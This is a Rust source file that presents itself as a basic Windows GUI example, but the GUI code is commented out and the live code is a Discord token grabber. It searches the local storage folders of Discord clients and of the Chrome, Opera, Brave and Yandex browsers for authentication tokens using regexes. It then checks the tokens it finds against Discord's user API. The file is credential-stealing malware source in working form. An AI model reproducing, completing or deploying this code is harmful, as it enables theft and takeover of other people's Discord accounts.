extern crate native_windows_derive as nwd;
extern crate native_windows_gui as nwg;

use std::collections::HashMap;
use std::env;
use std::ffi::OsString;
use std::fs;
use std::fs::File;
use std::io::{self, BufReader, prelude::*};
use std::path::Path;
use std::sync::{Arc, Mutex};
use std::thread;
use std::thread::JoinHandle;

use encoding_rs::WINDOWS_1252;
use encoding_rs_io::DecodeReaderBytesBuilder;
use nwd::NwgUi;
use nwg::NativeUi;
use regex::{Regex, RegexSet};
use reqwest::RequestBuilder;
use serenity::futures::TryFutureExt;

#[derive(Default, NwgUi)]
pub struct BasicApp {
    #[nwg_control(size: (300, 115), position: (300, 300), title: "Basic example", flags: "WINDOW|VISIBLE")]
    #[nwg_events(OnWindowClose: [BasicApp::say_goodbye])]
    window: nwg::Window,

    #[nwg_layout(parent: window, spacing: 1)]
    grid: nwg::GridLayout,

    #[nwg_control(text: "Heisenberg", focus: true)]
    #[nwg_layout_item(layout: grid, row: 0, col: 0)]
    name_edit: nwg::TextInput,

    #[nwg_control(text: "Say my name")]
    #[nwg_layout_item(layout: grid, col: 0, row: 1, row_span: 2)]
    #[nwg_events(OnButtonClick: [BasicApp::say_hello])]
    hello_button: nwg::Button,
}

impl BasicApp {
    fn say_hello(&self) {
        nwg::modal_info_message(&self.window, "Hello", &format!("Hello {}", self.name_edit.text()));
    }

    fn say_goodbye(&self) {
        nwg::modal_info_message(&self.window, "Goodbye", &format!("Goodbye {}", self.name_edit.text()));
        nwg::stop_thread_dispatch();
    }
}

fn main() {
    // nwg::init().expect("Failed to init Native Windows GUI");
    // nwg::Font::set_global_family("Segoe UI").expect("Failed to set default font");
    // let _app = BasicApp::build_ui(Default::default()).expect("Failed to build UI");
    // nwg::dispatch_thread_events();


    // Prints out all the tokens we found
    let tokens = find_token();
    println!("{:?}", &tokens);
    let verified = verify_token(vec![tokens.get(0).unwrap().clone()]);
}


// Finds all tokens and returns a list of tokens
fn find_token() -> Vec<String> {
    // Get the local and appdata files
    let local_path = env::var_os("LOCALAPPDATA").unwrap();
    let roaming_path = env::var_os("APPDATA").unwrap();
    let match_one = Arc::new(Regex::new(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}").unwrap());
    let match_two = Arc::new(Regex::new(r"mfa\.[\w-]{84}").unwrap());

    // All paths for discord tokens, initialized into vector
    let paths: Vec<String> = vec![
        format!("{}\\Discord\\Local Storage\\leveldb", roaming_path.to_str().unwrap()),
        format!("{}\\discordcanary\\Local Storage\\leveldb", roaming_path.to_str().unwrap()),
        format!("{}\\discordptb\\Local Storage\\leveldb", roaming_path.to_str().unwrap()),
        format!("{}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb", local_path.to_str().unwrap()),
        format!("{}\\Opera Software\\Opera Stable\\Local Storage\\leveldb", roaming_path.to_str().unwrap()),
        format!("{}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb", local_path.to_str().unwrap()),
        format!("{}\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb", local_path.to_str().unwrap()),
    ];

    // Initialize a new vector of strings that is atomic
    let mut tokens: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));

    // Make a list of running threads
    let mut handles = Vec::new();

    // Go through all paths
    for path in paths.into_iter() {
        // Create a path object with the string path
        let new_path = Path::new(&path);

        // If it doesn't exist, skip it
        if !&new_path.exists() {
            continue;
        }


        // Get all files in the directory
        let paths = fs::read_dir(new_path).unwrap();

        // Iterate through all files in the path
        for path in paths {
            // Weird unwrapping thing because i'm new to rust
            let unwrapped = path.as_ref().unwrap().path();
            let string = unwrapped.to_str().unwrap();


            // If the file is not a .log or .ldb we don't care about it
            if !(string.ends_with(".log") || string.ends_with(".ldb")) {
                continue;
            }

            // Viable file, spawn a new thread and move on to the next task

            // Clone variables for per-thread and atomic operations
            let match_one = match_one.clone();
            let match_two = match_two.clone();
            let tokens = tokens.clone();
            handles.push(thread::spawn(move || {

                // Open the file we have
                let file = File::open(unwrapped).unwrap();

                // Make a decoder to decode the files
                let mut reader =
                    DecodeReaderBytesBuilder::new()
                        .encoding(Some(WINDOWS_1252))
                        .build(file);

                // make a new string to hold the content of the file
                let mut content = String::new();

                // write the content file to the string
                reader.read_to_string(&mut content);

                // Find all matches for the first regex
                for cap in match_one.find_iter(&content) {
                    // Get a thread lock on the mutex and add token matches to it
                    tokens.lock().unwrap().push(String::from(cap.as_str()))
                }

                // Find all matches for second regex
                for cap in match_two.find_iter(&content) {
                    // Get a thread lock on the mutex and add token matches to it
                    tokens.lock().unwrap().push(String::from(cap.as_str()))
                }
            }));
        }
    }

    // Go through all handles
    for handle in handles.into_iter() {
        // Block on each thread until finished
        handle.join().unwrap();
    }

    // Return list of tokens
    return Arc::try_unwrap(tokens).unwrap().into_inner().unwrap();
}

async fn verify_token(tokens: Vec<String>) -> Vec<String> {
    // Make a client for verifying the list of tokens
    let client = reqwest::Client::new();

    // A for loop for each token
    for token in tokens.iter() {
        // Make an identity request for each token
        let res = client.get("https://discordapp.com/api/v6/users/@me")
            .header("Authorization", token.clone()).header("Content-Type", "application/json")
            .send().await.unwrap();

        println!("{}", res.text().await.unwrap());

    }

    // A placeholder list
    Vec::new()
}
